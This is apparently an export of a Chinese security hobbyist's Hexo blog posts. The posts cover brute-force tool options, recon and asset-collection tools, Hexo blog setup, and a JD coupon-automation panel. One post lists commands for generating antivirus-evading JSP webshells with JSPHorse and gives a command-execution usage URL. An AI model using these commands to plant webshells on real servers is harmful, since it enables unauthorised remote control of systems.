class="line">  -o OutFile            输出文件名。 默认为： _proxy.servers.txt 或 _cracked.accounts.txt</span><br><span class="line">  --debug               进入调试模式，观察程序行为</span><br><span class="line">  --silent              减少程序输出，只输出破解成功的条目</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>资产收集工具整理</title>
    <url>/2021/11/10/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>整理一下这几天群里蹲到师傅们分享的工具</p>
<span id="more"></span>

<h3 id="domain-hunter-pro"><a href="#domain-hunter-pro" class="headerlink" title="domain hunter pro"></a><a href="https://github.com/bit4woo/domain_hunter_pro">domain hunter pro</a></h3><p>这是一个bp的插件，只需使用br提供的代理访问网站就可以实现资产的自动挖掘功能，</p>
<p>还整合了一些右键快捷菜单，导出功能和一些工具</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636513135613-2021-11-1010:58:55.png"></p>
<h3 id="JSPHorse"><a href="#JSPHorse" class="headerlink" title="JSPHorse"></a><a href="https://github.com/EmYiQing/JSPHorse">JSPHorse</a></h3><p>这个算是利用工具，用来生成jsp的免杀马的</p>
<p>生成标准形式基础Webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password</span><br></pre></td></tr></table></figure>

<p>生成蚁剑的免杀Webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --ant</span><br></pre></td></tr></table></figure>

<p>全局Unicode编码（JSP支持全局Unicode编码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password -u</span><br></pre></td></tr></table></figure>

<p>生成进阶版Webshell（Javac动态编译class）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --super</span><br></pre></td></tr></table></figure>

<p>进阶版Webshell基础上全局Unicode编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --super -u</span><br></pre></td></tr></table></figure>

<p>使用ScriptEngine调用JS免杀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --js</span><br></pre></td></tr></table></figure>

<p>使用ScriptEngine调用JS免杀基础上全局Unicode编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JSPHorse.jar -p your_password --js -u</span><br></pre></td></tr></table></figure>

<p>如何使用？</p>
<p><code>1.jsp?pwd=your_password&amp;cmd=calc.exe</code></p>
<h3 id="Allin"><a href="#Allin" class="headerlink" title="Allin"></a><a href="https://github.com/P1-Team/AlliN">Allin</a></h3><p>一个辅助平常渗透测试项目或者攻防项目快速打点的综合工具    </p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636514144744-2021-11-1011:15:44.png"></p>
<p>常用的参数记录一下，具体的直接-h就能看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python AlliN.py --host &quot;xxx.com&quot; -m infoscan</span><br></pre></td></tr></table></figure>

<p><code>-m</code>支持的参数有</p>
<ol>
<li>infoscan 扫信息</li>
<li>fscan　用fofa配合-q参数，参数内容是fofa语法</li>
<li>pscan 扫端口</li>
<li>tscan　扫标题，默认</li>
<li>subscan　子域名</li>
<li>backscan　后台</li>
<li>oxid　目标主机网卡</li>
</ol>
<h3 id="LiqunKit"><a href="#LiqunKit" class="headerlink" title="LiqunKit"></a>LiqunKit</h3><p>这本来是一个漏洞利用的工具，但这个jar包不知为什么没跑起来，试了半天，看了issue有和我一样的问题，但我java版本也是1.8的，jar包名字也没修改过不知道为什么会不行，提个issue问下吧</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>资产收集</tag>
      </tags>
  </entry>
  <entry>
    <title>部署博客hexo+stun</title>
    <url>/2021/11/03/%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2hexo-stun/</url>
    <content><![CDATA[<h1 id="部署hexo-stun"><a href="#部署hexo-stun" class="headerlink" title="部署hexo+stun"></a>部署hexo+stun</h1><p>用Github Pages + Hexo折腾个博客玩    </p>
<p>踩了几个坑，Github page那踩了一个（仓库名是<code>github用户名.github.io</code>），npm的时候踩了一个</p>
<h2 id="部署流程"><a href="#部署流程" class="headerlink" title="部署流程"></a>部署流程</h2><ol>
<li><p>环境准备，需要有node,git环境(并且配好ssh-key)</p>
</li>
<li><p>安装hexo <code>sudo npm install -g hexo-cli</code></p>
<p><strong>除这之外都不能全局安装</strong></p>
</li>
<li><p>初始化hexo <code>hexo init LycsBlog</code></p>
</li>
<li><p>导航到博客目录<code>cd LycsBlog</code></p>
</li>
<li><p>安装依赖<code>sudo npm install　--registry https://registry.npm.taobao.org</code></p>
</li>
<li><p>自动部署插件<code>sudo npm install hexo-deployer-git --save</code></p>
</li>
<li><p>配置下<code>_config.yml</code>的<code>deploy</code>参数，仓库地址和type <a href="https://hexo.io/zh-cn/docs/one-command-deployment">配置官网</a></p>
</li>
<li><p>根据这个<a href="https://github.com/liuyib/hexo-theme-stun/">stun主题</a>的安装进行配置</p>
</li>
</ol>
<ul>
<li><p>常用hexo命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean #　清理</span><br><span class="line">hexo g #　生成静态文件</span><br><span class="line">hexo s #　启动本地服务器</span><br><span class="line">hexo d #　部署到github仓库</span><br><span class="line">hexo new &#x27;title&#x27; #　新建博文，会在source/_posts/生成一个md</span><br></pre></td></tr></table></figure></li>
</ul>
<p>好了，第一篇就水玩了,重新启用了以前没换系统前在windows在gitee上搞得图床，整个图</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/piapiapia-2021-11-318:25:54.gif"></p>
]]></content>
      <categories>
        <category>折腾hexo</category>
      </categories>
  </entry>
  <entry>
    <title>青龙面板+jd薅羊毛</title>
    <url>/2021/11/20/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF-jd%E8%96%85%E7%BE%8A%E6%AF%9B/</url>
    <content><![CDATA[<p>周六了，整点花活，薅一波羊毛</p>
<span id="more"></span>

<h2 id="使用docker-compose安装青龙面板"><a href="#使用docker-compose安装青龙面板" class="headerlink" title="使用docker-compose安装青龙面板"></a>使用docker-compose安装青龙面板</h2><blockquote>
<p>这个面板就是用来执行定时任务的</p>
<p>参考官方仓库<a href="https://github.com/whyour/qinglong">https://github.com/whyour/qinglong</a></p>
</blockquote>
<ol>
<li>docker-compose 安装</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>或者国内的拉得慢可以在github的网址前面加一个镜像<code>http://ghproxy.com</code></p>
<ol start="2">
<li>启动容器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir qinglong</span><br><span class="line">wget https://raw.githubusercontent.com/whyour/qinglong/develop/docker-compose.yml</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止</span></span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>



<h2 id="配置青龙面板通知"><a href="#配置青龙面板通知" class="headerlink" title="配置青龙面板通知"></a>配置青龙面板通知</h2><p>然后访问<code>htpp://your_vps_ip:5700</code></p>
<p>配置过程中我推送选择了企业微信的应用，</p>
<p>其中需要配几个参数</p>
<h3 id="获取access-token"><a href="#获取access-token" class="headerlink" title="获取access_token"></a>获取access_token</h3><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637384970495-2021-11-2013:09:30.png"></p>
<ul>
<li><p>corpid可以在<a href="https://work.weixin.qq.com/wework_admin/frame#profile">企业微信管理后台</a> “我的企业”－”企业id”里面找到</p>
</li>
<li><p>corpsecret就是创建对应的企业应用的secret</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637385261385-2021-11-2013:14:21.png"></p>
</li>
</ul>
<h3 id="获取userid"><a href="#获取userid" class="headerlink" title="获取userid"></a>获取userid</h3><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637384694556-2021-11-2013:04:54.png"></p>
<p>然后按照他提示的格式用分号分割就行</p>
<h3 id="下载自动化脚本"><a href="#下载自动化脚本" class="headerlink" title="下载自动化脚本"></a>下载自动化脚本</h3><p>我用的是这个脚本</p>
<p><a href="https://github.com/zero205/JD_tencent_scf/tree/main">https://github.com/zero205/JD_tencent_scf/tree/main</a></p>
<p>因为我用的是docker部署，所以先进入docker内部bash</p>
<ul>
<li><p>查看容器名叫啥</p>
<p><code>docker ps</code></p>
</li>
<li><p>进入容器</p>
<p><code>docker exec -it qinglong_web_1 bash</code></p>
</li>
<li><p>然后利用青龙的cli把目标js脚本库拖下来</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ql repo https://github.com/zero205/JD_tencent_scf.git &quot;jd_|jx_|getJDCookie&quot; &quot;backUp|icon&quot; &quot;^jd[^_]|USER|sendNotify|sign_graphics_validate|JDJR|JDSign&quot; &quot;main&quot;</span><br></pre></td></tr></table></figure>

<p>然后就完成了，重新打开web面板就会找到一车定时任务</p>
<h2 id="配置京东的cookie"><a href="#配置京东的cookie" class="headerlink" title="配置京东的cookie"></a>配置京东的cookie</h2><p>有很详细的教程获取京东的cookie，<strong>注意需要是chroiumn内核的浏览器和访问的是<code>m.jd.com</code></strong></p>
<p>我用firefox没找到对应的cookie键值对</p>
<p><a href="https://github.com/zero205/JD_tencent_scf/blob/main/backUp/GetJdCookie.md">https://github.com/zero205/JD_tencent_scf/blob/main/backUp/GetJdCookie.md</a></p>
<p>找到键值对之后去青龙的后台添加一下环境变量</p>
<p>键是<code>JD_COOKIE</code>值就是按照上面网址获取下来的东西</p>
<p>还有一个就是他的cookie是有有效期的，使用手机验证码登录大概一个月左右，也就是在不清除浏览器cookie和退出浏览器京东帐号的情况下一个月后需要重新获取一次cookie</p>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
</search>
